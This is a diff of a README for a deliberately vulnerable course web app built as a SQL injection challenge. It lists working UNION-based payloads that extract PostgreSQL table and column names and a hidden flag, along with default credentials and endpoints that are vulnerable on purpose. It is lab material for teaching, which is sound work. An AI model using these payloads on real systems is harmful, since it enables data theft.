@@ -10,9 +10,12 @@ This is a 3-tier web application designed as a SQL injection challenge for educa
 
 ## Features
 
-1. **Vulnerable Login Page**: SQL injection can be used to bypass authentication and gain admin access
-2. **Admin Panel**: After successful login, admins can view a list of computers
-3. **Vulnerable Search**: SQL injection in the search bar can be used to extract database schema information
+1. **Vulnerable Login Page**: SQL injection can be used to bypass authentication
+2. **Session Management**: Users stay logged in after page refresh (session persistence)
+3. **Access Control**: Only users with login ID "admin" can access the admin panel
+4. **Admin Panel**: After successful admin login, users can view a list of computers
+5. **Vulnerable Search**: SQL injection in the search bar can be used to extract database schema information
+6. **Flag Challenge**: Extract the hidden flag from the database using SQL injection
 
 ## Prerequisites
 
@@ -45,28 +48,37 @@ Try these payloads in the username or password field:
 
 ### Challenge 2: Schema Extraction
 
-After gaining admin access, try these **working** payloads in the search box:
+After logging in as admin, try these **working** payloads in the search box:
 
-**Extract Table Names:**
-- `' UNION SELECT table_name, null, null FROM information_schema.tables WHERE table_schema='public' --`
+**Extract Table Names and Columns:**
+- `' AND 1=0 UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema='public' --`
 
-**Extract Columns for a Table:**
-- `' UNION SELECT column_name, data_type, null FROM information_schema.columns WHERE table_schema='public' AND table_name='users' --`
+**Extract Just Table Names:**
+- `' AND 1=0 UNION SELECT 1, tablename, null FROM pg_tables WHERE schemaname='public' --`
 
-**Extract All Schema Information:**
-- `' UNION SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema='public' ORDER BY table_name, ordinal_position --`
+**Note:** 
+- The query selects 3 columns (id, computer_name, ip_address), so UNION SELECT must also return 3 columns
+- Use integer `1` for the first column to match the `id` type
+- `AND 1=0` ensures the original query returns no results, showing only the UNION SELECT data
+- Results appear in: ID column (1), Computer Name column (table/column names), IP Address column (data types)
 
-**Alternative Method (using pg_tables):**
-- `' UNION SELECT tablename, null, null FROM pg_tables WHERE schemaname='public' --`
+### Challenge 3: Extract the Flag
 
-**Note:** The query selects 3 columns, so UNION SELECT must also return 3 columns. Use `null` to fill extra columns.
+Find and extract the flag from the `flag` table:
+
+- `' AND 1=0 UNION SELECT 1, flag, null FROM flag --`
+
+The flag will appear in the "Computer Name" column.
 
 See `SQL_INJECTION_GUIDE.md` for detailed instructions and a Python demo script.
 
 ## Default Credentials
 
-- Username: `admin`, Password: `admin123` (normal login)
-- Username: `user1`, Password: `password1` (user role, not admin)
+- Username: `admin`, Password: `admin123` (admin access - can see computer list)
+- Username: `user1`, Password: `password1` (standard user - limited access)
+- Username: `test`, Password: `test123` (standard user - limited access)
+
+**Important:** Only users with login ID "admin" can access the admin panel and computer list, regardless of SQL injection attempts.
 
 ## Project Structure
 
@@ -90,16 +102,34 @@ _itp4416_asmt/
 
 ## API Endpoints
 
-- `POST /api/login` - Login endpoint (vulnerable to SQL injection)
-- `GET /api/computers?role=admin` - Get list of computers (requires admin)
-- `GET /api/search?role=admin&q=<search_term>` - Search computers (vulnerable to SQL injection)
+- `POST /api/login` - Login endpoint (vulnerable to SQL injection, creates session)
+- `GET /api/session` - Get current session information
+- `POST /api/logout` - Logout and clear session
+- `GET /api/computers?username=admin` - Get list of computers (requires admin username)
+- `GET /api/search?username=admin&q=<search_term>` - Search computers (vulnerable to SQL injection, requires admin)
 - `GET /api/health` - Health check endpoint
+
+**Note:** Endpoints check for admin access based on the username/login ID, not just role.
+
+## Database Schema
+
+The database contains the following tables:
+
+- **users**: Stores user credentials (id, username, password, role)
+- **computers**: Stores computer information (id, computer_name, ip_address)
+- **flag**: Contains the challenge flag (id, flag)
 
 ## Security Warning
 
 ⚠️ **This application is intentionally vulnerable and should NEVER be deployed to production!**
 
 This is an educational tool designed to demonstrate SQL injection vulnerabilities. The code contains intentional security flaws for learning purposes.
+
+**Vulnerabilities demonstrated:**
+- SQL injection in login endpoint
+- SQL injection in search endpoint
+- Improper input validation
+- Direct string concatenation in SQL queries
 
 ## Stopping the Application
 
@@ -111,3 +141,23 @@ To remove volumes (database data):
 ```bash
 docker-compose down -v
 ```
+
+## Additional Resources
+
+- `SQL_INJECTION_GUIDE.md` - Detailed guide with step-by-step instructions
+- `sql_injection_demo.py` - Python script demonstrating automated SQL injection extraction
+
+## Troubleshooting
+
+**Port already in use:**
+- Backend uses port 5001 (changed from 5000 to avoid conflicts)
+- Frontend uses port 8080
+- Database uses port 5432
+
+**Session not persisting:**
+- The application uses both server-side sessions (cookies) and localStorage as fallback
+- Clear browser cache if experiencing issues
+
+**Database initialization:**
+- Database is automatically initialized on first startup
+- To reset: `docker-compose down -v && docker-compose up --build`
